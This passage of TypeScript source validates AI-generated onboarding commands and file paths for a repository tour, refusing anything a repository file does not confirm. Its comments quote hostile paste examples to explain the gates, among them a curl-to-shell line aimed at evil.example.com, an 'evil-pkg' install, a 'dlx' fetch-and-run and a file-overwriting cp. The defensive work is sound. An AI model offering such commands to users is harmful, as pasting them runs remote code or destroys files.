import {
  OnboardingSectionKind,
  OnboardingTaskComplexity,
  type Onboarding,
  type OnboardingDropped,
  type OnboardingEmptyReason,
  type OnboardingEnvVar,
  type OnboardingFlow,
  type OnboardingLink,
  type OnboardingPackageBlock,
  type OnboardingReadingStep,
  type OnboardingSection,
  type OnboardingSetupCommand,
  type OnboardingTask,
  type OnboardingTaskStep,
} from '@devdigest/shared';
import { sanitizeRelativePath, truncateCodePoints } from '../_shared/repo-paths.js';
import {
  MAX_BODY_CHARS,
  MAX_COMMANDS_PER_PACKAGE,
  MAX_DIAGRAM_CHARS,
  MAX_ENV_VARS,
  MAX_FLOWS,
  MAX_FLOW_STEPS,
  MAX_LINE_CHARS,
  MAX_LINKS_PER_SECTION,
  MAX_PATH_CHARS,
  MAX_READING_STEPS,
  MAX_SETUP_COMMANDS,
  MAX_TASK_STEPS,
  MAX_TASKS,
} from './constants.js';
import type { DiscoveredPackage } from './generation-types.js';
import type { OnboardingResponse } from './prompt.js';

/**
 * onboarding · grounding — the code half of the feature, and the only half that
 * decides what is true.
 *
 * The model proposes; nothing in this file trusts it. A claim survives only when
 * something outside the answer confirms it: a path exists in the clone, a script
 * is a key of that package's own manifest, a manager is the one that package's
 * lock file dictates, a service is declared in the compose file the command acts
 * on. What cannot be confirmed is DROPPED and COUNTED — never repaired, never
 * normalised to the nearest legal value, because normalising is how a sixth
 * section arrives wearing the name of a fifth.
 *
 * Everything here is pure. Existence was decided before this runs and arrives as
 * `verified`, which is what lets the whole rule set be tested against one
 * deliberately hostile response with no clone, no model and no database.
 *
 * The order of the gates is part of the rule, not an implementation detail:
 * `sanitizeRelativePath` runs FIRST on every path, before any membership or
 * existence test (AC-41). A four-kilobyte string that was never a path must not
 * reach a set lookup, and `..` must not be resolved by anything downstream.
 */

/** What the grounding is checked against. All of it is code-authored fact. */
export interface OnboardingGroundingContext {
  /** Every path proven to exist in the clone. Probing happened before this. */
  verified: Set<string>;
  /** Every path appearing in the critical-path chains shown to the model. */
  chainPaths: Set<string>;
  /** Every top-ranked path shown to the model as a sample. */
  rankedPaths: Set<string>;
  packages: DiscoveredPackage[];
  envSources: { path: string; text: string }[];
  /** Read WHOLE, not probed: a compose command is grounded in the file's text. */
  composeSources: { path: string; text: string }[];
  chains: string[][];
}

/**
 * Two facts the five contract counters do not name.
 *
 * They stay out of the record on purpose. AC-40 fixes exactly five reasons and
 * two sibling slices read exactly those five keys, so these go to the audit log
 * instead of quietly becoming a sixth and a seventh.
 */
export interface OnboardingGroundingExtras {
  /**
   * A claim whose path EXISTS but is outside the set that claim may draw from —
   * a flow step off the chains (AC-14), a reading step outside chains ∪ ranked
   * (AC-28). One counter for both because it is one fact: the file is real and
   * the model was not shown it here.
   *
   * `unknown_path` would be a lie about either — the clone does have the file —
   * and a sixth contract counter is not available: AC-40 fixes five reasons and
   * two sibling slices read exactly those five names.
   */
  off_chain: number;
  unknown_env: number;
}

export interface GroundedOnboarding {
  tour: Onboarding;
  dropped: OnboardingDropped;
  extra: OnboardingGroundingExtras;
}

/** The gate every model-written path passes before anything else looks at it. */
export function sanitizePath(raw: string): string | null {
  return sanitizeRelativePath(raw, MAX_PATH_CHARS);
}

/** One line of model prose, cut to its cap. Prose only — never a command. */
function line(raw: string): string {
  return truncateCodePoints(raw.trim(), MAX_LINE_CHARS);
}

/**
 * A path that is both syntactically a path and known to exist, or `null` with
 * `unknown_path` incremented. The two failures are one counter by AC-38's
 * wording: the claim points at something that is not there.
 */
function verifiedPath(
  raw: string,
  ctx: OnboardingGroundingContext,
  dropped: OnboardingDropped,
): string | null {
  const path = sanitizePath(raw);
  if (path === null || !ctx.verified.has(path)) {
    dropped.unknown_path += 1;
    return null;
  }
  return path;
}

/**
 * Characters a command token may contain.
 *
 * This is the narrowest gate in the file and it is not about tidiness: these
 * strings are shown with a copy control and PASTED INTO A SHELL by a person who
 * is new to the repository. `;`, `&&`, `|`, backticks, `$(`, `#`, redirections
 * and quotes are all absent from the class, so `pnpm dev; curl … | sh` cannot pass a
 * check that only asked whether the line starts with `pnpm` and mentions `dev`.
 * Nothing generated is ever executed by the server, but the reader is the
 * execution engine here, and this is the last gate before them.
 */
const SAFE_COMMAND_TOKEN = /^[A-Za-z0-9._:@/=+-]+$/;

/**
 * The three spellings an install may take, and a whole install command is the
 * manager plus one of them — nothing after it.
 *
 * `add` is absent from the set and is no longer kept out BY the set: the length
 * bound in `groundInstall` refuses `pnpm add react` for the same reason it
 * refuses `pnpm install react`, which is that both install something the lock
 * file does not pin. Until 2026-08-18 there was no such bound, only this set
 * matched against the second token, so `pnpm install evil-pkg` was emitted
 * verbatim beside a copy control — and `npm install <pkg>` runs that package's
 * `postinstall` on the machine of whoever pasted it.
 */
const INSTALL_VERBS = new Set(['install', 'i', 'ci']);

/**
 * The four scripts npm runs WITHOUT `run`.
 *
 * This list is npm's, not ours, and it is a measurement rather than a
 * recollection: on npm 10.9.8 (2026-08-18), against one manifest declaring
 * `test`, `start`, `stop`, `restart`, `dev` and `build`, the bare form ran the
 * first four and answered `Unknown command: "dev"` / `"build"` for the last two.
 * They are built-in npm commands that happen to run the like-named script; npm
 * has no general bare form behind them.
 *
 * pnpm, yarn and bun run ANY script bare, so this set gates npm alone. It must
 * not be extended by guess: a name added here that npm does not implement is a
 * line that errors the moment it is pasted, which is the one failure this whole
 * file exists to prevent. Re-measure before touching it.
 */
const NPM_BARE_COMMANDS = new Set(['test', 'start', 'stop', 'restart']);

/**
 * The suffixes that make one file an EXAMPLE of another: `.env.example` → `.env`.
 *
 * The two `PACKAGE_CONFIG_FILES` ships, and the only `cp` this feature has any
 * business offering — "copy the template the repository committed into the file
 * it is a template for". A `cp` with a free destination is a different sentence.
 */
const EXAMPLE_SUFFIXES = ['.example', '.sample'] as const;

/** The file an example file is an example OF, or `null` when it is not one. */
function targetOfExample(path: string): string | null {
  for (const suffix of EXAMPLE_SUFFIXES) {
    if (path.length > suffix.length && path.endsWith(suffix)) {
      return path.slice(0, -suffix.length);
    }
  }
  return null;
}

/**
 * The interpreters a committed script may be handed to, and there is no third.
 *
 * `bash` and `sh` read a file and run it. `zsh` and `node` would too, but each
 * name added here is another program whose flag set has to be reasoned about
 * before the two-token bound is trusted — and neither is what a repository's own
 * README tells a newcomer to type. `source` and `.` are absent for a stronger
 * reason than taste: they run the file in the READER'S OWN shell, so a script
 * that would have exited leaves its `cd`, its exports and its `set -e` behind.
 */
const SCRIPT_RUNNERS = new Set(['bash', 'sh']);

/**
 * The repo-relative path of the script this command runs, or `null` when the
 * command is not one of the two spellings a script is allowed.
 *
 * `./<path>` as ONE token, or `<runner> <path>` as exactly two. The bare
 * `<path>` is deliberately not a third spelling: a shell answers `command not
 * found` to it, so it is a line that fails the moment it is pasted, which is the
 * one outcome this whole file exists to prevent.
 *
 * NOTHING may follow the path. This is the same bound `runsScript` and
 * `groundInstall` hold, for a sharper reason: `sh -c <anything>` turns the
 * runner into a shell that treats the rest of the line as SOURCE, and a flag on
 * a repository script switches it into a mode nobody read. A script that needs
 * an argument is a command this tour cannot offer.
 *
 * The path goes through `sanitizePath` like every other path in this file rather
 * than through a check of its own, so `..`, an absolute path, a `.git` segment
 * and a control character are all refused by the gate that already refuses them
 * everywhere else (AC-41). The caller then requires the result to be the file
 * `source_path` names, and that file to exist in the clone.
 */
function scriptPathOf(parts: string[]): string | null {
  const first = parts[0];
  if (first === undefined) return null;
  if (parts.length === 1) return first.startsWith('./') ? sanitizePath(first) : null;
  const path = parts[1];
  if (parts.length !== 2 || !SCRIPT_RUNNERS.has(first) || path === undefined) return null;
  // A leading `-` is a flag to every runner in the set, never a path, and the
  // equality the caller applies is not a safe place to find that out.
  return path.startsWith('-') ? null : sanitizePath(path);
}

const ENV_NAME = /^[A-Za-z_][A-Za-z0-9_]{0,127}$/;

/** Compose flags that take no value. Anything else `-` is refused, `-f` included. */
const COMPOSE_FLAGS = new Set([
  '-d',
  '--detach',
  '--build',
  '--wait',
  '--no-deps',
  '--remove-orphans',
]);

function tokens(command: string): string[] {
  return command.trim().split(/\s+/).filter((token) => token !== '');
}

/**
 * Whether every token of a command is one a reader may safely paste.
 *
 * A COMMAND CARRIES NO COMMENT. `#` is outside `SAFE_COMMAND_TOKEN`, so a line
 * bearing one is dropped whole — the mockup's
 * `cp .env.example .env # add OPENAI + STRIPE keys` included. That divergence
 * from the design is deliberate (human decision, 2026-08-18) and rests on two
 * independent reasons:
 *
 *  - `#` is inert in POSIX sh and in bash. It is NOT inert in an INTERACTIVE
 *    zsh, where `INTERACTIVE_COMMENTS` is off by default — `#` is then an
 *    ordinary word, and `pnpm dev # && curl evil.example.com | sh` pasted into
 *    the shell this project's own contributors use runs the `curl`.
 *  - A comment would have to carry the tour's prose, which is Ukrainian
 *    (`TOUR_LANGUAGE`), so commas, parentheses and apostrophes. In an
 *    interactive zsh `(` opens a subshell and `'` opens a quote. The characters
 *    the prose needs and the characters that make a paste dangerous are the same
 *    characters, so no filter can separate them.
 *
 * The explanation has its own field. `why` is beside every command in
 * `OnboardingSetupCommand` and in the package command shape, it is normalised
 * through `line()`, and nothing ever executes it.
 */
function isSafeCommand(parts: string[]): boolean {
  return parts.length > 0 && parts.every((token) => SAFE_COMMAND_TOKEN.test(token));
}

/**
 * A command is REJECTED when it is longer than its cap, never truncated.
 *
 * Every other free string in this file is cut to fit. A command may not be: cut
 * `docker compose up -d postgres redis` at a character boundary and what is left
 * is still a runnable line that does something else. Prose survives truncation;
 * an instruction does not.
 */
function withinCommandCap(command: string): boolean {
  return [...command].length <= MAX_LINE_CHARS;
}

/* ------------------------------------------------------------------ sections */

interface GroundedSection {
  title: string;
  body: string;
  diagram?: string;
  links: OnboardingLink[];
  verified_paths: string[];
}

/**
 * Path-like tokens in a body: a token containing `/`, or one ending in an
 * extension this repository's own walk would parse. Deliberately conservative —
 * this list only ever ADDS a link to a path already proven to exist, and a token
 * it misses is left as plain text, which is the safe direction to fail in.
 */
const BODY_PATH_TOKEN = /[A-Za-z0-9_@.-][A-Za-z0-9_@.\-/]*/g;
const BODY_PATH_EXTENSION =
  /\.(ts|tsx|js|jsx|mjs|cjs|json|md|ya?ml|sql|css|scss|sh|py|go|rs|java|rb|php|toml|ini|env|example|lock)$/i;

/** Every token in a body that is shaped like a path. No sanitizing, no verdict. */
function bodyPathTokens(body: string): string[] {
  const found: string[] = [];
  for (const raw of body.match(BODY_PATH_TOKEN) ?? []) {
    const trimmed = raw.replace(/[.,:;)\]}]+$/, '');
    if (!trimmed.includes('/') && !BODY_PATH_EXTENSION.test(trimmed)) continue;
    found.push(trimmed);
  }
  return found;
}

/**
 * The paths a section's body names that are real.
 *
 * It never rewrites the body. A renderer links what is in here and leaves an
 * unverified path as text (AC-39), which is what keeps the prose the model wrote
 * and the claim the pipeline confirmed two separate things.
 */
export function collectBodyPaths(body: string, ctx: OnboardingGroundingContext): string[] {
  const found: string[] = [];
  const seen = new Set<string>();
  for (const raw of bodyPathTokens(body)) {
    const path = sanitizePath(raw);
    if (path === null || seen.has(path) || !ctx.verified.has(path)) continue;
    seen.add(path);
    found.push(path);
  }
  return found;
}

/**
 * Every path this answer claims, sanitized and deduplicated — the list the
 * caller probes the clone with before any of it is grounded.
 *
 * It lives beside the rules that consume the answer rather than in the executor
 * because of what it shares with `collectBodyPaths`: one vocabulary of "this
 * token is a path". A second copy in the caller would decide differently the
 * first time either was edited, and the paths it then failed to probe would
 * arrive at grounding as `unknown_path` — a file that exists, reported as one
 * that does not.
 *
 * THE ORDER IS THE PROBE ORDER, and it is not incidental: the structured claims
 * come first and the prose tokens last, so a body that names two hundred
 * path-like strings cannot spend the probe ceiling before a single link, flow
 * step, reading item or task has been checked.
 *
 * SETUP COMMANDS ARE COLLECTED BEFORE TASKS, and that ordering is load-bearing
 * rather than tidy. `setup_commands` is bounded by `MAX_SETUP_COMMANDS` and its
 * `source_path` is the file that AUTHORISES a command a reader will paste into a
 * shell, so a run that cannot probe it loses the whole "run it once per clone"
 * list — while `tasks` is bounded by nothing the model has to respect. Behind
 * tasks, one verbose answer emptied that list and counted every one of its true
 * claims `unknown_path`.
 *
 * THE TASK CONTRIBUTION IS CAPPED AT WHAT CAN BE STORED, `MAX_TASKS` × (1 +
 * `MAX_TASK_STEPS`). Grounding keeps at most that many task claims, so probing
 * further buys nothing and spends a ceiling the prose tokens behind it still
 * need. The two bounds have to be the SAME bound: `groundTasks` and
 * `groundTaskSteps` stop at exactly these two numbers, so no claim this refuses
 * to probe is ever counted `unknown_path` by them — which is the corruption
 * `MAX_PATH_PROBES`'s own docstring warns about, a real file reported as
 * missing.
 *
 * A body is read at `MAX_BODY_CHARS`, the same cut `groundSections` applies, so
 * a path only in the tail the cap removes is not probed for — it could not
 * become a `verified_path` of a body nobody will see.
 *
 * `run[].package_path` and `env_vars[].source_path` are deliberately absent: the
 * first is a KEY into the packages the walk found and the second is checked
 * against the text of the config files this run read. Neither is answered by the
 * clone, so neither is worth a probe.
 */
export function collectClaimedPaths(response: OnboardingResponse): string[] {
  const found: string[] = [];
  const seen = new Set<string>();
  const add = (raw: string): void => {
    const path = sanitizePath(raw);
    if (path === null || seen.has(path)) return;
    seen.add(path);
    found.push(path);
  };

  for (const section of response.sections) for (const link of section.links) add(link.path);
  for (const flow of response.flows) for (const step of flow.steps) add(step.path);
  for (const item of response.reading_path) add(item.path);
  for (const entry of response.setup_commands) add(entry.source_path);
  for (const task of response.tasks.slice(0, MAX_TASKS)) {
    add(task.path);
    // A step's path is a structured claim like the task's own, so it is probed
    // with them and never with the prose. A task carrying six steps is six more
    // reads against `MAX_PATH_PROBES`, which is why that ceiling moved with this.
    for (const step of task.steps.slice(0, MAX_TASK_STEPS)) {
      if (step.path !== null) add(step.path);
    }
  }
  for (const section of response.sections) {
    for (const token of bodyPathTokens(truncateCodePoints(section.body.trim(), MAX_BODY_CHARS))) {
      add(token);
    }
  }
  return found;
}

function groundLinks(
  links: OnboardingResponse['sections'][number]['links'],
  ctx: OnboardingGroundingContext,
  dropped: OnboardingDropped,
): OnboardingLink[] {
  const kept: OnboardingLink[] = [];
  for (const link of links) {
    const path = verifiedPath(link.path, ctx, dropped);
    if (path === null) continue;
    kept.push({ label: line(link.label), path });
  }
  return kept.slice(0, MAX_LINKS_PER_SECTION);
}

/**
 * The sections the model returned, by kind, with everything in them grounded.
 *
 * A `kind` outside the five is dropped and counted — AC-42's whole point is that
 * it is rejected rather than shown sixth. A kind returned twice keeps the first
 * occurrence: the five are a fixed set of slots, and no counter in the contract
 * names "said the same thing twice".
 */
function groundSections(
  sections: OnboardingResponse['sections'],
  ctx: OnboardingGroundingContext,
  dropped: OnboardingDropped,
): Map<OnboardingSectionKind, GroundedSection> {
  const found = new Map<OnboardingSectionKind, GroundedSection>();
  for (const section of sections) {
    const kind = OnboardingSectionKind.safeParse(section.kind);
    if (!kind.success) {
      dropped.unknown_section += 1;
      continue;
    }
    if (found.has(kind.data)) continue;

    const body = truncateCodePoints(section.body.trim(), MAX_BODY_CHARS);
    const diagram =
      kind.data === 'architecture' && section.diagram !== null && section.diagram.trim() !== ''
        ? truncateCodePoints(section.diagram.trim(), MAX_DIAGRAM_CHARS)
        : undefined;

    found.set(kind.data, {
      title: line(section.title),
      body,
      // `verified_paths` is read off the CAPPED body: a path in the tail the cap
      // removed is not in what will be rendered, so claiming it is verified there
      // would point a link at prose nobody can see.
      verified_paths: collectBodyPaths(body, ctx),
      links: groundLinks(section.links, ctx, dropped),
      ...(diagram === undefined ? {} : { diagram }),
    });
  }
  return found;
}

/* --------------------------------------------------------------------- lists */

function groundFlows(
  flows: OnboardingResponse['flows'],
  ctx: OnboardingGroundingContext,
  dropped: OnboardingDropped,
  extra: OnboardingGroundingExtras,
): OnboardingFlow[] {
  const kept: OnboardingFlow[] = [];
  for (const flow of flows) {
    const steps: OnboardingFlow['steps'] = [];
    for (const step of flow.steps) {
      const path = verifiedPath(step.path, ctx, dropped);
      if (path === null) continue;
      if (!ctx.chainPaths.has(path)) {
        // A real file that is in none of the chains the model was shown. AC-14
        // makes it not a flow step; it is not an unconfirmable claim either, so
        // it goes to the audit rather than to one of the five.
        extra.off_chain += 1;
        continue;
      }
      steps.push({ path, note: line(step.note) });
    }
    const bounded = steps.slice(0, MAX_FLOW_STEPS);
    if (bounded.length < 2) continue;
    kept.push({ title: line(flow.title), steps: bounded });
  }
  return kept.slice(0, MAX_FLOWS);
}

/**
 * The reading order, kept exactly as the model wrote it.
 *
 * NO REORDERING, and that is deliberate: AC-28 fixes only that the first item is
 * a file from the chains or the ranked set, which holds by construction for
 * whatever survives the membership test. Moving an item would silently rewrite
 * the model's judgement about what to read first, and the cut takes the tail —
 * the end it ranked last.
 */
function groundReading(
  items: OnboardingResponse['reading_path'],
  ctx: OnboardingGroundingContext,
  dropped: OnboardingDropped,
  extra: OnboardingGroundingExtras,
): OnboardingReadingStep[] {
  const kept: OnboardingReadingStep[] = [];
  for (const item of items) {
    const path = verifiedPath(item.path, ctx, dropped);
    if (path === null) continue;
    // A real file outside both sets the model was shown (AC-28). Dropped, and
    // counted in `off_chain` — the audit's word for "the path is real and this
    // claim was not entitled to it", which a flow step off the chains already
    // used. `unknown_path` would say the clone does not have the file, which is
    // untrue here, and a sixth contract counter is not available (AC-40).
    if (!ctx.chainPaths.has(path) && !ctx.rankedPaths.has(path)) {
      extra.off_chain += 1;
      continue;
    }
    kept.push({ path, reason: line(item.reason) });
  }
  return kept.slice(0, MAX_READING_STEPS);
}

/**
 * A step's command, kept only when it is VERBATIM one this run already grounded
 * for "How to run" (AC-7), and `null` with `unknown_script` counted otherwise.
 *
 * Membership in that set is the WHOLE gate, and it is the strongest one this
 * feature can offer: every string in it has already passed
 * `SAFE_COMMAND_TOKEN`, the length cap, the manager-and-script test or the
 * authorising-file test. So the newest surface — a command inside a task step,
 * drawn beside a copy control — can emit nothing that "How to run" would not
 * have emitted, and it cannot weaken a single one of those gates because it
 * re-implements none of them.
 *
 * Verbatim means verbatim: `pnpm  dev` with two spaces is not `pnpm dev` and is
 * dropped. Normalising it here would be repairing a command, which is the one
 * thing this file never does to a string that will be executed.
 */
function stepCommand(
  raw: string | null,
  grounded: Set<string>,
  dropped: OnboardingDropped,
): string | null {
  if (raw === null || raw.trim() === '') return null;
  const command = raw.trim();
  if (!grounded.has(command)) {
    dropped.unknown_script += 1;
    return null;
  }
  return command;
}

/**
 * The actions of one task, each grounded on its own.
 *
 * A step whose `path` does not check out KEEPS ITS TEXT and loses only the link
 * (AC-5, AC-6): "add a guard to the error handler" is a useful instruction
 * without a clickable file, and `unknown_path` still counts the claim that did
 * not hold. Nothing here scans `text` for path-like tokens — the only linkable
 * path is the structured field, which is what makes "a path-shaped string in the
 * prose stays plain text" (AC-50) true by construction rather than by a second
 * path vocabulary that would drift from `collectBodyPaths`.
 *
 * `MAX_TASK_STEPS` is applied to what survived, because membership is not a
 * bound on the answer: one allowed path repeated twenty times passes a
 * membership test twenty times (`server/INSIGHTS.md`).
 */
function groundTaskSteps(
  steps: OnboardingResponse['tasks'][number]['steps'],
  ctx: OnboardingGroundingContext,
  dropped: OnboardingDropped,
  grounded: Set<string>,
): OnboardingTaskStep[] {
  const kept: OnboardingTaskStep[] = [];
  for (const step of steps) {
    kept.push({
      text: line(step.text),
      path:
        step.path === null || step.path.trim() === ''
          ? null
          : verifiedPath(step.path, ctx, dropped),
      command: stepCommand(step.command, grounded, dropped),
    });
  }
  return kept.slice(0, MAX_TASK_STEPS);
}

/**
 * Every command this run has already grounded — the set a task step's command
 * must be a member of.
 *
 * Built from the RESULT of `groundRun` and `groundSetupCommands` rather than
 * from the response, which is why `groundTasks` runs after both of them: the
 * allowed set is defined as what "How to run" survived with (AC-7), so a task
 * grounded first would be checked against an empty set and every step command
 * would be dropped for a reason that was never the model's.
 */
function groundedCommands(
  packages: OnboardingPackageBlock[],
  setup: OnboardingSetupCommand[],
): Set<string> {
  const commands = new Set<string>();
  for (const block of packages) {
    if (block.install_command !== null) commands.add(block.install_command);
    for (const command of block.commands) commands.add(command.command);
  }
  for (const entry of setup) commands.add(entry.command);
  return commands;
}

/**
 * A `complexity` outside the three rejects THE WHOLE TASK (AC-32).
 *
 * It is checked before the path, so a task that is wrong in both ways is counted
 * once, under the reason that came first. The steps are grounded only for a task
 * that survived both: a rejected task's claims are not counted twice.
 */
function groundTasks(
  tasks: OnboardingResponse['tasks'],
  ctx: OnboardingGroundingContext,
  dropped: OnboardingDropped,
  grounded: Set<string>,
): OnboardingTask[] {
  const kept: OnboardingTask[] = [];
  for (const task of tasks) {
    const complexity = OnboardingTaskComplexity.safeParse(task.complexity);
    if (!complexity.success) {
      dropped.unknown_complexity += 1;
      continue;
    }
    const path = verifiedPath(task.path, ctx, dropped);
    if (path === null) continue;
    kept.push({
      title: line(task.title),
      path,
      why: line(task.why),
      complexity: complexity.data,
      steps: groundTaskSteps(task.steps, ctx, dropped, grounded),
      // Prose, and cut to the same `MAX_LINE_CHARS` every other single-line
      // field takes. Nothing verifies what either says — see the contract's own
      // warning that this `impact` is not `repo-intel`'s.
      impact: line(task.impact),
      verification: line(task.verification),
    });
  }
  return kept.slice(0, MAX_TASKS);
}

/* ------------------------------------------------------------- how to run it */

/**
 * `.` for the root package, and no `sanitizeRelativePath` on this one — the value
 * is not used as a path, it is a KEY into the set of packages the walk found. The
 * sanitizer refuses `.` outright (it has no segments), and the root package is
 * the one block that must always be there.
 */
function normalizePackagePath(raw: string): string | null {
  const trimmed = raw.trim().replace(/^\.\//, '').replace(/\/+$/, '');
  if (trimmed === '' || trimmed === '.') return '.';
  return sanitizePath(trimmed);
}

/**
 * `<manager> <install verb>`, and NOTHING else on the executable side.
 *
 * The length bound is the rule; the verb set only says which two-token lines are
 * an install. Without it the check read "starts with the manager, second token
 * is `install`" and every trailing argument went unexamined, which made
 * `pnpm install evil-pkg` a grounded, copyable line — the exact thing
 * `INSTALL_VERBS`' own docstring said could not happen.
 */
function groundInstall(
  raw: string | null,
  manager: string,
  dropped: OnboardingDropped,
): string | null {
  if (raw === null || raw.trim() === '') return null;
  const parts = tokens(raw);
  const verb = parts[1];
  if (
    !withinCommandCap(raw.trim()) ||
    !isSafeCommand(parts) ||
    parts.length !== 2 ||
    parts[0] !== manager ||
    verb === undefined ||
    !INSTALL_VERBS.has(verb)
  ) {
    dropped.manager_mismatch += 1;
    return null;
  }
  return parts.join(' ');
}

/**
 * Whether these tokens are THIS package's manager running THIS package's script,
 * and nothing besides.
 *
 * Two shapes, `<manager> <script>` and `<manager> run <script>`, and the whole
 * sequence is tested rather than its two ends. The old test was
 * `parts[0] === manager && parts.includes(script)`, which said nothing about the
 * middle: `pnpm dlx evil-cli dev` satisfied it whenever `dev` was a real script,
 * and `pnpm dlx` / `npm exec` / `yarn dlx` fetch and run an arbitrary registry
 * package. `pnpm --dir /elsewhere dev` is the same hole wearing a flag.
 *
 * A script that genuinely needs an argument is dropped and counted. That is a
 * command this feature cannot offer, not one it should approximate.
 *
 * `run` is OPTIONAL for pnpm, yarn and bun, which run any script from the bare
 * form. npm is the exception in both directions: `npm dev` answers
 * `Unknown command: "dev"` (npm 10.9.8), so a bare npm line would error the
 * moment it was pasted — but `npm test` and `npm start` are real npm commands
 * that work, and `npm test` is among the first commands a newcomer types.
 * Refusing it would drop a command that is neither broken nor rare. So the bare
 * form is allowed for npm exactly over `NPM_BARE_COMMANDS`, and `run` is
 * required for every other script.
 */
function runsScript(exec: string[], manager: string, script: string): boolean {
  if (exec[0] !== manager) return false;
  const rest = exec.slice(1);
  if (manager === 'npm' && rest[0] !== 'run' && !NPM_BARE_COMMANDS.has(script)) return false;
  const named = rest[0] === 'run' ? rest.slice(1) : rest;
  return named.length === 1 && named[0] === script;
}

/**
 * One block per package the model named, filled from the WALK and not from the
 * answer: `name`, `path` and `manager` are the discovered package's own, so the
 * model can only choose which package to talk about and which of its scripts to
 * recommend.
 *
 * Blocks come out in the order the walk found the packages, which is what keeps
 * the root package first however the model ordered its answer (AC-94).
 */
function groundRun(
  blocks: OnboardingResponse['run'],
  ctx: OnboardingGroundingContext,
  dropped: OnboardingDropped,
): OnboardingPackageBlock[] {
  const byPath = new Map(ctx.packages.map((pkg, index) => [pkg.path, { pkg, index }]));
  const kept = new Map<string, { block: OnboardingPackageBlock; index: number }>();

  for (const block of blocks) {
    const key = normalizePackagePath(block.package_path);
    const found = key === null ? undefined : byPath.get(key);
    if (found === undefined) {
      dropped.unknown_path += 1;
      continue;
    }
    const { pkg, index } = found;
    if (kept.has(pkg.path)) continue;

    if (pkg.manager === null) {
      // No lock file beside it, or two that disagree. Every command written for
      // it is a manager claim we cannot confirm, which is exactly this counter
      // (AC-87 and the two-lock-file case that reads the same way).
      if (block.install_command !== null && block.install_command.trim() !== '') {
        dropped.manager_mismatch += 1;
      }
      dropped.manager_mismatch += block.commands.length;
      kept.set(pkg.path, {
        index,
        block: {
          name: pkg.name,
          path: pkg.path,
          manager: null,
          install_command: null,
          commands: [],
        },
      });
      continue;
    }

    const manager = pkg.manager;
    const scripts = new Set(pkg.scripts);
    const commands: OnboardingPackageBlock['commands'] = [];
    for (const command of block.commands) {
      if (!scripts.has(command.script)) {
        dropped.unknown_script += 1;
        continue;
      }
      const parts = tokens(command.command);
      if (
        !withinCommandCap(command.command.trim()) ||
        !isSafeCommand(parts) ||
        !runsScript(parts, manager, command.script)
      ) {
        dropped.manager_mismatch += 1;
        continue;
      }
      commands.push({ script: command.script, command: parts.join(' '), why: line(command.why) });
    }

    kept.set(pkg.path, {
      index,
      block: {
        name: pkg.name,
        path: pkg.path,
        manager,
        install_command: groundInstall(block.install_command, manager, dropped),
        commands: commands.slice(0, MAX_COMMANDS_PER_PACKAGE),
      },
    });
  }

  return [...kept.values()].sort((a, b) => a.index - b.index).map((entry) => entry.block);
}

/* --------------------------------------------------------- setup and the env */

/**
 * The service names a compose file DECLARES.
 *
 * A line scanner rather than a YAML parser, because the repository has no YAML
 * dependency and this question does not need one: the keys one level under a
 * top-level `services:` are the answer, and anything this misses simply fails to
 * authorise a command — the safe direction. It is not a parser and must not grow
 * into one; a file it cannot read yields an empty set and every service named
 * against it is dropped and counted.
 */
export function composeServices(text: string): Set<string> {
  const services = new Set<string>();
  let inServices = false;
  let indent: number | null = null;

  for (const rawLine of text.split(/\r?\n/)) {
    if (!inServices) {
      if (/^services:\s*(#.*)?$/.test(rawLine)) inServices = true;
      continue;
    }
    if (rawLine.trim() === '' || /^\s*#/.test(rawLine)) continue;

    const lead = /^([ \t]*)\S/.exec(rawLine);
    if (lead === null) continue;
    const width = (lead[1] ?? '').length;
    if (width === 0) break; // a new top-level key: the services block ended
    if (indent === null) indent = width;
    if (width !== indent) continue; // a key of one service, not a service

    const key = /^[ \t]*(?:"([^"]+)"|'([^']+)'|([A-Za-z0-9][A-Za-z0-9._-]*))\s*:/.exec(rawLine);
    const name = key?.[1] ?? key?.[2] ?? key?.[3];
    if (name !== undefined) services.add(name);
  }
  return services;
}

/**
 * Whether the authorising file really authorises this command.
 *
 * Three shapes, and no fourth. This is the longest chain in the feature from
 * somebody else's text to a human's action — the line is rendered with a copy
 * control and then RUN — so "looks like a command" is not the test. The test is
 * that the file named in `source_path` proves the command does what it says:
 *
 *  - `cp X Y` is authorised when X IS that file AND Y is the file X is an
 *    example of. Copying something else is a different claim about a file we did
 *    not check; copying it SOMEWHERE else is a claim about the destination, and
 *    the destination is the half that gets overwritten. Until 2026-08-18 only
 *    the source was constrained, so `cp .env.example server/src/index.ts` was
 *    authorised and emitted — a line whose reader destroys a file in their own
 *    checkout by following it.
 *  - `docker compose up …` is authorised when the file is the compose file AND
 *    every service the command names is declared in it. An undeclared service is
 *    not nearly right — it is an invention handed over as an instruction.
 *  - `./<script>` or `<runner> <script>` is authorised when the script IS the
 *    cited file — which the caller has already proven exists in the clone. Added
 *    2026-08-18 on a human's request: a repository that ships one script to
 *    bring a clone up from nothing (`./scripts/dev.sh` here) has no way to say so
 *    through the other two shapes, and that line is the most useful one a
 *    newcomer can be given.
 *
 *    The trust here is the trust `run` already extends and no more. `pnpm dev`
 *    executes whatever somebody else's `package.json` says; the difference is
 *    only in what confirms it — a script name against the manifest there, the
 *    file's existence in the clone here. What is NOT extended is the argument:
 *    the shape carries a path and stops, so nothing the model wrote survives
 *    into the line except which committed file to run.
 *
 * `parts` is the WHOLE line — every token of it, already held to
 * `SAFE_COMMAND_TOKEN`. There is no comment half to split off: a command carries
 * no comment, and `cp` is therefore exactly three tokens or nothing.
 */
function setupCommandIsAuthorised(
  parts: string[],
  sourcePath: string,
  ctx: OnboardingGroundingContext,
): boolean {
  if (parts[0] === 'cp') {
    if (parts.length !== 3) return false;
    const from = parts[1] === undefined ? null : sanitizePath(parts[1]);
    const to = parts[2] === undefined ? null : sanitizePath(parts[2]);
    return from === sourcePath && to !== null && to === targetOfExample(sourcePath);
  }

  const script = scriptPathOf(parts);
  if (script !== null) return script === sourcePath;

  let rest: string[] | null = null;
  if (parts[0] === 'docker' && parts[1] === 'compose') rest = parts.slice(2);
  else if (parts[0] === 'docker-compose') rest = parts.slice(1);
  if (rest === null) return false;

  const verb = rest[0];
  if (verb !== 'up' && verb !== 'start') return false;

  const compose = ctx.composeSources.find((file) => file.path === sourcePath);
  if (compose === undefined) return false;

  const declared = composeServices(compose.text);
  for (const arg of rest.slice(1)) {
    if (arg.startsWith('-')) {
      if (!COMPOSE_FLAGS.has(arg)) return false;
      continue;
    }
    if (!declared.has(arg)) return false;
  }
  return true;
}

/**
 * Repo-level setup commands, each kept only if a file that exists authorises it.
 *
 * Everything that fails is counted in `unknown_path`, and the contract's own
 * docstring says why that is the counter rather than a sixth one: the claim
